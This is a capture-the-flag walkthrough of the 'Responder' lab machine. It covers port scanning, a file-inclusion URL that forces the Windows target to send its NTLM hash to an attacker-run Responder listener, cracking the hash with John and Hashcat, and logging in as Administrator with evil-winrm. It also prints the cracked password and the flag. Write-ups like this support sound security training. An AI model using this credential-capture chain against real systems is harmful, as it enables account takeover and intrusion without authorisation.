# CTF Walkthrough: Responder

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Steps](#2-steps)

---

## 1. Introduction

**Category:** Responder, Remote File Inclusion (RFI), John The Ripper, Hashcat, evil-winrm, SMB       
**Difficulty Level:** Very Easy   
**CVE(s) involved:** -

---

## 2. Steps

1. Service Enumeration
    - Command: `nmap -sV -p- 10.129.80.224`
        - Output:
            ```
            PORT     STATE SERVICE VERSION
            80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
            |_http-title: Unika
            |_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
            5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
            |_http-server-header: Microsoft-HTTPAPI/2.0
            |_http-title: Not Found
            Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
            ```

2. Visit `10.129.80.224`, gets redirected to `unika.htb`

3. Add `10.129.80.224` to `/etc/hosts`
    - Command: `sudo vim /etc/hosts`
        - Output:
            ```
            10.129.80.224 unika.htb
            ```
4. Start Responder
    - Command: `sudo responder -I tun0`

5. Remote File Inclusion
    - Visit `http://unika.htb/index.php?page=//<ATTACKING_IP>/test`


6. Save the hash to `hash.txt`

7. Crack the hash with
    - Method 1: John the Ripper
        - Command: `john hash.txt -w=/usr/share/wordlists/rockyou.txt`
            - Output:
                ```
                Press 'q' or Ctrl-C to abort, almost any other key for status
                badminton        (Administrator)
                1g 0:00:00:00 DONE (2025-04-22 01:55) 33.33g/s 273066p/s 273066c/s 273066C/s 123456..whitetiger
                ```
    - Method 2: Hashcat
        - Command: `hashcat hash.txt /usr/share/wordlists/rockyou.txt`
            - Output:
                ```
                69ab90d297d2fb90a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100370030000000000000000000:badminton
                ```

8. Connect to winrm
    - Command: `evil-winrm -i 10.129.80.224 -u Administrator -p badminton`

9. Get Flag
    - Command: `cd C:\Users\mike\Desktop`
    - cat flag.txt
        - Flag: ea81b7afddd03efaa0945333ed147fac
